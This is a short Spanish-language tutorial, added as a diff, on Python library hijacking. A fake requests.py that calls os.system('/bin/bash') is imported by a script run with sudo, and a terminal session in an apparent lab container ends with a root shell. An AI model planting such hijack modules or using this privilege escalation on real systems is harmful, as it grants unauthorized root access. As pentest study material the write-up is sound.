@@ -1,0 +1,55 @@
+Esta técnica explota la forma en que Python (y otros lenguajes de programación) 
+
+resuelve las importaciones de módulos.
+
+¿Cómo Funciona?
+
+1- #Orden de Búsqueda de Módulos#:
+
+Cuando Python importa un módulo, sigue un orden de búsqueda específico. 
+
+Primero busca en el directorio actual desde donde se ejecuta el script. 
+
+Si encuentra un archivo con el mismo nombre que el módulo que intenta 
+
+importar, lo cargará en lugar del módulo original.
+
+2- #Creación de un Módulo Malicioso#:
+
+
+Al crear un archivo con el mismo nombre que un módulo legítimo 
+
+(en este caso, requests.py), podemos inyectar código malicioso que 
+
+se ejecutará cuando el script intente importar ese módulo.
+
+
+3- #Ejecución del Código Malicioso#:
+
+
+Cuando ejecutamos el script con sudo, y este intenta importar requests, 
+
+Python carga el archivo requests.py en lugar del módulo real. El código 
+
+dentro del archivo se ejecuta con los privilegios del proceso que ejecuta 
+
+el script, en este caso, root.
+
+Ejemplo:iker@181f77f462ad:~$ cat geo_ip.py 
+import requests; 
+ip = input('Introduce la direccion IP que quieras geolocalizar: ')
+respuesta = requests.get(f'http://ip-api.com/json/{ip}')
+data = respuesta.json()
+print(data)nano requests.py
+
+nano requests.py
+import os
+os.system('/bin/bash')
+
+iker@181f77f462ad:~$ sudo /usr/bin/python3 /home/iker/geo_ip.py
+root@181f77f462ad:/home/iker# whoami
+root
+root@181f77f462ad:/home/iker# 
+
+
+
